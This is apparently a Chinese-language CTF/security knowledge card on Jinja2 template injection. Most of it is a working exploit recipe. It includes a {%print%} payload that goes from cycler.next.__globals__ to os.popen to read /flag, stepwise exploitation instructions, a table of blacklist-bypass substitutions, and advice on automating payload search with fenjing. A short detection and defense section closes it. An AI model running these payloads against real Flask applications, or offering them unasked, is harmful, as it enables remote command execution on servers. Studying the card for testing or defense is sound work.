---
id: web-python-ssti-jinja2-cycler-getitem-adjacent-literal-fenjing
title: cycler.next 全局链 + __getitem__ 字符串下标 + 相邻字面量：绕过黑名单的 Jinja2 print 语句块 payload 及其自动化生成
type: scenario
domain: web
path: web/python/ssti
technique: jinja2-cycler-next-getitem-adjacent-literal-fenjing-autogen
aliases:
- cycler.next.__globals__
- __getitem__ 替代点号属性
- 相邻字符串绕过 cat
- fenjing 生成 payload
- print 语句块 SSTI
tags:
- python
- jinja2
- ssti
- flask
- waf-bypass
- fenjing
- rce
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-T2-3W2
  verified_at: '2026-11-08T18:30:35+08:00'
  notes: 已对照原文核对；本次核对未读取图片；payload（cycler.next.__globals__.__getitem__('__b''uiltins__')…popen('c''at /flag')）与原文逐字一致，{%print%} 语句块与 fenjing 自动化描述相符；未验证点：未在靶机复现，原文触发回显截图未读
---

## 一句话结论

当 Jinja2 模板里 `{{ }}` 与点号属性访问被黑名单拦掉时，可改用 `{%print ...%}` 语句块，并把所有属性访问换成 `.__getitem__('key')`（键本身再用相邻字面量拆开：`'__b''uiltins__'`、`'__i''mport__'`、`'c''at'`），从 `cycler.next.__globals__` 走到 `__builtins__` 再 `__import__('os').popen(...)`；这类“多层变换”的 payload 适合交给 fenjing 一类自动化工具按回显 oracle 搜索生成。

## 原理

- **语句块入口**：`{{ expr }}` 是输出表达式，`{%print expr %}` 是语句块，两者都能求值任意 Python 表达式；多数 WAF 规则只盯 `{{`，`{%` 常被漏掉。
- **`cycler` 是 Flask/Jinja2 默认全局**：模板上下文里可直接引用 `cycler`，其 `next` 方法能取到 `__globals__`，进而拿到模块全局里的 `__builtins__`——这条链不依赖 `config`/`request`/`lipsum`，在被过滤掉常见全局时仍可用。
- **`__getitem__` 替代点号**：`obj['key']` 在 Jinja2 里等价于 `obj.__getitem__('key')` 调用；黑名单常只过滤 `.` 后紧跟敏感属性名（`__globals__`、`__builtins__`、`__import__`）的形式，写成方法调用并把键作为字符串参数传入可以绕开。
- **相邻字面量拼接**：Python 词法在编译期把相邻字符串常量拼接，`'__b''uiltins__'` 与 `'__builtins__'` 等价，而源码里不存在连续 `__builtins__` 子串；同理 `'c''at'` 让 `cat` 不出现在 payload 里。
- **为什么适合自动化**：这类 payload 的可绕点很多（入口、属性写法、字符串拆分、命令拆分），手工试错成本高；fenjing 之类工具把“回包是否含标记”作为 oracle，自动搜索满足黑名单约束的等价表达式。

## 触发条件

- 用户输入被拼进 Jinja2 模板并渲染（`render_template_string`、`Template(...).render`），运行在非沙箱环境。
- 存在关键字黑名单（拦 `{{`、`.`
  后敏感属性、`cat`、`os`、`builtins` 等）但未禁用 `{%` 语句块、未用 `SandboxedEnvironment`。
- 响应中有回显，或可构造布尔/时间 oracle。

## 利用步骤

1. 用 `{{7*7}}` 确认模板注入；若被拦，改 `{%print 7*7%}` 看是否回显 49，确认语句块可用。
2. 用 `{{self}}` 或 `{%print cycler%}` 确认 `cycler` 等全局可用；若 `{{ }}` 全被拦，只用 `{%print%}`。
3. 逐级构造：`cycler.next.__globals__` → `.__getitem__('__builtins__')` → `.__getitem__('__import__')('os')` → `.popen('id').read()`。
4. 把每一步的敏感字符串改成相邻字面量（`'__b''uiltins__'`、`'__i''mport__'`、`'c''at /flag'`），每改一次重发确认仍回显。
5. 被拦时换等价写法：`|attr('__globals__')`、`['__globals__']`、`__getattribute__`、`request.application.__globals__`、`lipsum.__globals__`。
6. 也可直接交给 fenjing 一类工具：给定 URL、注入点参数与“成功回包特征”，让它自动搜索出可用 payload，再人工收敛成最短形式。

## PoC

```jinja2
{%print ((cycler.next.__globals__.__getitem__('__b''uiltins__')).__getitem__('__i''mport__'))('os').popen('c''at /flag').read()%}
```

```text
分段理解（等价于直接写属性）：
cycler.next                      -> 取到方法对象
  .__globals__                   -> 该方法所在模块的全局命名空间
  .__getitem__('__b''uiltins__')  -> 等价 ['__builtins__']，字面量被拆开规避子串匹配
  .__getitem__('__i''mport__')    -> 等价 ['__import__']
  ('os')                         -> 导入 os
  .popen('c''at /flag').read()    -> 执行并回显
```

```text
常见替换表（任一被拦时横向替换）：
{%print expr%}      <->  {{ expr }}
obj.attr            <->  obj['attr']  <->  obj.__getitem__('attr')  <->  obj|attr('attr')
'__builtins__'      <->  '__b''uiltins__'  <->  '__buil'~'tins__'
'cat /flag'         <->  'c''at /flag'  <->  'c'~'at /flag'  <->  'cat /fla'~'g'
```

## 变体与关联

- **链起点变体**：`lipsum.__globals__`、`url_for.__globals__`、`get_flashed_messages.__globals__`、`request.application.__globals__`、`''.__class__.__mro__[1].__subclasses__()`。
- **绕过滤器变体**：`|attr`、`__getattribute__`、十六进制/`chr` 构造字符串、`~` 拼接、`request.args` 二次传参。
- **关联**：[[web-python-ssti-jinja2-print-tag-adjacent-literal-json-cmd]]（同源的 `{%print%}` + 相邻字面量，入口是 JSON body、链走 `g.pop`；本卡的区别是 `cycler.next` 起点与 `__getitem__` 写法）、[[web-python-ssti-jinja2-subclasses-index-rce]]（全局链不可用时的子类枚举回退）、[[web-python-ssti-jinja2-waf-bypass-hex-attr-args]]（其他绕过形态）。
- **边界**：启用 `SandboxedEnvironment` 后 `__globals__`/`__subclasses__` 均被 `SecurityError` 拦截；`{%` 也被过滤且无其他语句块入口时，只能退化为只读表达式探测。

## 检测与防御

- **修复**：不使用 `render_template_string` 渲染用户输入；必须动态模板时用 `SandboxedEnvironment` 并移除 `cycler`/`lipsum` 等不必要全局。
- **加固**：WAF 同时覆盖 `{{`、`{%`、`__globals__`、`__builtins__`、`__getitem__`、`|attr` 与相邻字面量拼接特征；对模板渲染结果做输出编码。
- **检测**：请求参数中出现 `{%print`、`__globals__`、`__getitem__`、`subclasses`、`popen`、`attr(` 等特征；短时间内同一参数大量结构相似但字符串拆分方式不同的请求（自动化搜索特征）。
